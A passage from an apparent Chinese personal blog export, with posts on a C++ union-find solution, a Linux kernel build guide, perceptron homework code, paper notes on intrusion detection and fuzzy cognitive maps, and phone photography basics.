<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造并查集</span></span><br><span class="line">    <span class="built_in">UF</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">0</span>);</span><br><span class="line">        size = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            size[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回节点x的根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = parent[parent[x]];<span class="comment">//路径压缩</span></span><br><span class="line">            x = parent[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断p 和 q是否互相连通</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">return</span> rootp == rootq;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将p和q连通</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (rootp == rootq)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//按秩合并，高树顶点做根</span></span><br><span class="line">        <span class="keyword">if</span> (size[rootp] &gt; size[rootq]) &#123;</span><br><span class="line">            parent[rootq] = rootp;</span><br><span class="line">            size[rootp] += size[rootq];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            parent[rootp] = rootq;</span><br><span class="line">            size[rootq] += size[rootp];</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断所有节点是否连通</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">allConnected</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> root = <span class="built_in">find</span>(parent[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; count; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">find</span>(parent[i]);</span><br><span class="line">            <span class="keyword">if</span> (tmp != root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; parent;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; size; <span class="comment">//用来存储树的大小，为按秩合并做准备</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按t排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(pair&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, <span class="keyword">int</span>&gt;&amp; a, pair&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, <span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.second &lt; b.second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, M;</span><br><span class="line">    cin &gt;&gt; N &gt;&gt; M;</span><br><span class="line">    <span class="function">UF <span class="title">uf</span><span class="params">(N + <span class="number">1</span>)</span></span>;</span><br><span class="line">    vector&lt;pair&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, <span class="keyword">int</span>&gt;&gt; record; <span class="comment">// 记录输入((x,y), t)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, y, t;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; y &gt;&gt; t;</span><br><span class="line">        record.<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(<span class="built_in">make_pair</span>(x, y), t));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(record.<span class="built_in">begin</span>(), record.<span class="built_in">end</span>(), cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (pair&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, <span class="keyword">int</span>&gt;&amp; i : record) &#123;</span><br><span class="line">        uf.<span class="built_in">Union</span>(i.first.first, i.first.second);</span><br><span class="line">        <span class="keyword">if</span> (uf.<span class="built_in">allConnected</span>()) &#123;</span><br><span class="line">            ans = i.second;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P3402-可持久化并查集"><a href="#P3402-可持久化并查集" class="headerlink" title="P3402 可持久化并查集"></a>P3402 可持久化并查集</h2><p><a href="https://www.luogu.com.cn/problem/P3402">https://www.luogu.com.cn/problem/P3402</a></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>并查集</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>基于增量式GHSOM神经网络模型的入侵检测研究</title>
    <url>/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>增量式学习; 生长型分层自组织映射; 入侵检测; 神经网络; 信息安全; 网络安全</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>GHSOM (Growing Hierarchical Self-Organizing Maps)：生长型分层自组织映射</li>
</ul>
<p><img src="/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20210524205136903.png" alt="image-20210524205136903"></p>
<h3 id="增量式学习"><a href="#增量式学习" class="headerlink" title="增量式学习"></a>增量式学习</h3><ol>
<li>不断学习新样本</li>
<li>保留大部分以前学到的知识</li>
<li>渐进修正/增强以前学过的知识</li>
<li>更新后的知识可以适应更新后的数据，不必重新学习</li>
<li>降低了时间、空间需求</li>
</ol>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFD2014&amp;filename=JSJX201405021&amp;v=u%25mmd2FXyKNgKblZDXNd1PBDDrj4%25mmd2BkCMAh5GmPm2gysD0h%25mmd2FlNMKEyMtTn3Y1mpOCwBZ1e</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title>如何编译内核源码</title>
    <url>/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<ol>
<li><a href="https://www.kernel.org/">https://www.kernel.org/</a> 下载内核源码 linux-5.4.128</li>
</ol>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630105003356.png" alt="image-20210630105003356"></p>
<ol>
<li><code>sudo su</code> 切换成 root，将内核源码解压到 <code>/usr/src</code> 目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xz -d linux-5.4.128.tar.xz</span><br><span class="line">tar xvf linux-5.4.128.tar -C /usr/src</span><br></pre></td></tr></table></figure>
<ol>
<li>进入源码目录 <code>/usr/src/linux-5.4.128</code></li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<ul>
<li>报错 1</li>
</ul>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630105059693.png" alt="image-20210630105059693"></p>
<p>解决方法 <a href="https://blog.csdn.net/zhangbaoxiang/article/details/114288159">https://blog.csdn.net/zhangbaoxiang/article/details/114288159</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install flex</span><br><span class="line">apt install bison</span><br></pre></td></tr></table></figure>
<p>重新来一次就可以成功配置</p>
<ul>
<li>报错 2</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>
<p>解决方法 <a href="https://blog.csdn.net/bhniunan/article/details/104039373">https://blog.csdn.net/bhniunan/article/details/104039373</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install libncurses5-dev</span><br></pre></td></tr></table></figure>
<ol>
<li>编译</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scripts/sign-file.c:25:10: fatal error: openssl/opensslv.h: No such file or directory</span><br></pre></td></tr></table></figure>
<p>解决方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install libssl-dev</span><br></pre></td></tr></table></figure>
<p>重新执行 make，产生报错 2</p>
<p>解决方法 <a href="https://blog.csdn.net/u010629326/article/details/73196311">参考评论</a>：<code>vi .config</code>，将 CONFIG_SYSTEM_TRUSTED_KEYS 设为空串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG_SYSTEM_TRUSTED_KEYS=&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630111334911.png" alt="image-20210630111334911"></p>
<p><img src="/2021/06/30/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/image-20210630111531298.png" alt="image-20210630111531298"></p>
<p>重新执行 make，有警告</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">warning: Cannot use CONFIG_STACK_VALIDATION=y, please install libelf-dev, libelf-devel or elfutils-libelf-devel</span><br></pre></td></tr></table></figure>
<p>但无报错</p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>感知器算法作业</title>
    <url>/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>编写感知器算法，求下列模式的解向量：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image002.png" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image004.png" alt="img"></p>
<p>设<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img"></p>
<h2 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h2><p>（1）将训练样本写成增广向量的形式，然后规范化（将属于<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image008.png" alt="img">的训练集样本乘以<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image010.png" alt="img">），任取初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image012.png" alt="img">开始迭代（这里已经给定为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img">），括号里的1代表迭代次数k=1</p>
<p>（2）用所有的训练样本进行迭代，每输入一个样本X都计算一次<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image014.png" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image016.png" alt="img"></p>
<p>这里的c为校正增量系数，大于0即可。</p>
<p>（3）只要某一轮中有一个样本的<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image018.png" alt="img">则回到（2），直到所有样本训练都正确分类。</p>
<h2 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h2><p>在编写代码时，将计算过程中每一步状态的值都cout出来，当设定初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img">，校正增量系数c为1时，有具体过程如下：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image020.jpg" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image022.jpg" alt="img"></p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image024.jpg" alt="img"></p>
<p>由此可得：解向量为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image026.png" alt="img"></p>
<p>判别函数为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image028.png" alt="img"></p>
<h2 id="结果分析讨论"><a href="#结果分析讨论" class="headerlink" title="结果分析讨论"></a>结果分析讨论</h2><p>（1）当我设定初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image030.png" alt="img">，校正增量系数c为1时，有最终的解向量输出结果如下：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image032.jpg" alt="img"></p>
<p>经5轮迭代，此时的解向量为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image034.png" alt="img">，判别函数为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image036.png" alt="img"></p>
<p>（2）当设定初始权向量<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image006.png" alt="img">，校正增量系数c为4时，有输出结果如下：</p>
<p><img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image038.jpg" alt="img"></p>
<p>迭代4轮后，输出解向量为<img src="/2019/10/17/%E6%84%9F%E7%9F%A5%E5%99%A8%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A/clip_image040.png" alt="img"></p>
<p>由此可得，当初始权向量和校正增量系数取不同值时，输出的结果并不相同，所以感知器算法的解，不是单值的。</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x[<span class="number">9</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">		&#123;<span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">// 权向量初始值w[1]   校正增量系数c   判别函数d  轮数roundCount   迭代标号k   错判次数mistake</span></span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> w[<span class="number">100</span>][<span class="number">4</span>] = &#123; &#123;<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>, <span class="number">-2</span>, <span class="number">-2</span>, <span class="number">0</span>&#125; &#125;;</span><br><span class="line">	<span class="comment">/*int w[100][4] = &#123; 0 &#125;;*/</span></span><br><span class="line">	<span class="keyword">int</span> d = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">double</span> c = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> roundCount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> mistake = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		mistake = <span class="number">0</span>;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; roundCount &lt;&lt; <span class="string">&quot;轮&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">8</span>; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			d = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">			&#123;</span><br><span class="line">				d += w[k][j] * x[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;WT(&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot;X&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; d &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">if</span> (d &lt;= <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k + <span class="number">1</span> &lt;&lt; <span class="string">&quot;)=&quot;</span> &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c</span><br><span class="line">					&lt;&lt; <span class="string">&quot;*X&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;=( &quot;</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">				&#123;</span><br><span class="line">					w[k + <span class="number">1</span>][j] = w[k][j] + c * x[i][j];</span><br><span class="line">					std::cout &lt;&lt; w[k + <span class="number">1</span>][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;)T&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">				++mistake;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k + <span class="number">1</span> &lt;&lt; <span class="string">&quot;)=&quot;</span> &lt;&lt; <span class="string">&quot;W(&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;)=( &quot;</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">				&#123;</span><br><span class="line">					w[k + <span class="number">1</span>][j] = w[k][j];</span><br><span class="line">					std::cout &lt;&lt; w[k + <span class="number">1</span>][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				std::cout &lt;&lt; <span class="string">&quot;)T&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			&#125;</span><br><span class="line">			++k;</span><br><span class="line">		&#125;</span><br><span class="line">		++roundCount;</span><br><span class="line">	&#125; <span class="keyword">while</span> (mistake &gt; <span class="number">0</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;解向量W=( &quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; w[k][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;)T&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	std::cin.<span class="built_in">get</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
      <tags>
        <tag>感知器算法</tag>
        <tag>模式识别</tag>
      </tags>
  </entry>
  <entry>
    <title>基于多目标进化算法的变密度模糊认知图学习</title>
    <url>/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Densities, fuzzy cognitive maps, multiobjective evolutionary algorithms (MOEAs), multiobjective optimization problems (MOP)</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/09/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%9B%AE%E6%A0%87%E8%BF%9B%E5%8C%96%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%98%E5%AF%86%E5%BA%A6%E6%A8%A1%E7%B3%8A%E8%AE%A4%E7%9F%A5%E5%9B%BE%E5%AD%A6%E4%B9%A0/image-20210524203330315.png" alt="image-20210524203330315"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/7094248">https://ieeexplore.ieee.org/document/7094248</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>FCM</tag>
        <tag>多目标优化MOP</tag>
      </tags>
  </entry>
  <entry>
    <title>手机摄影</title>
    <url>/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/</url>
    <content><![CDATA[<h2 id="1-手机摄影先验知识"><a href="#1-手机摄影先验知识" class="headerlink" title="1 手机摄影先验知识"></a>1 手机摄影先验知识</h2><h3 id="1-1-过曝与欠曝"><a href="#1-1-过曝与欠曝" class="headerlink" title="1.1 过曝与欠曝"></a>1.1 过曝与欠曝</h3><p>一、形成原因</p>
<ul>
<li>过曝：过多光线进入CMOS，导致画面丢失细节</li>
<li>欠曝：过少光线进入CMOS，导致画面太黑</li>
</ul>
<p>二、<strong>解决欠曝</strong></p>
<p>（1）扩大光圈</p>
<p>（2）延长曝光时间</p>
<p>（3）提高ISO</p>
<h3 id="1-2-快门"><a href="#1-2-快门" class="headerlink" title="1.2 快门"></a>1.2 快门</h3><p>一、长短快门</p>
<ul>
<li>短快门能抓拍一瞬间的画面</li>
<li>长快门能拍摄物体的运动轨迹</li>
</ul>
<p>二、糊片的原因</p>
<p>（1）物体本身运动速度快</p>
<p>（2）快门速度过慢，手抖就会导致模糊。这种情况保持设备稳定即可——三脚架</p>
<h3 id="1-3-噪点"><a href="#1-3-噪点" class="headerlink" title="1.3 噪点"></a>1.3 噪点</h3><p>光线较暗时拍的物体，勉强可以看清，但放大会发现有很多颗粒，这就是<strong>噪点</strong>。</p>
<p>一、噪点形成的原因</p>
<p>快门时间和光圈都已调试到最佳，但曝光不足，这时会增大给CMOS的电压，以提高ISO增加曝光，但这会形成噪点。</p>
<p>二、<strong>减少噪点的方法</strong></p>
<p>（1）补光</p>
<p>（2）使用三脚架固定手机，设置延长快门时间，降低ISO</p>
<h3 id="1-4-如何使用手机正确曝光"><a href="#1-4-如何使用手机正确曝光" class="headerlink" title="1.4 如何使用手机正确曝光"></a>1.4 如何使用手机正确曝光</h3><p>一、测光</p>
<p>目的：设置参数让画面不会过亮或者过暗，有一个适当的曝光</p>
<p>（1）HDR原理</p>
<p>a. 手机连续拍摄曝光值不同的照片</p>
<p>b. 把每张里正常曝光的部分保留下来</p>
<p>c. 合成</p>
<p>（2）曝光补偿</p>
<p>通过测光，控制进光量。</p>
<p>二、光线的方向</p>
<p>（1）顺光：呈现物体表面细节，但是缺乏立体感</p>
<p>（2）逆光： 呈现物体剪影和轮廓，但容易造成高光过曝和暗部欠曝</p>
<p>（3）侧光：塑造物体的立体感</p>
<h3 id="1-5-构图"><a href="#1-5-构图" class="headerlink" title="1.5 构图"></a>1.5 构图</h3><p>一、单一主体</p>
<p>尽可能让拍摄重点处于网格这四个点的附近</p>
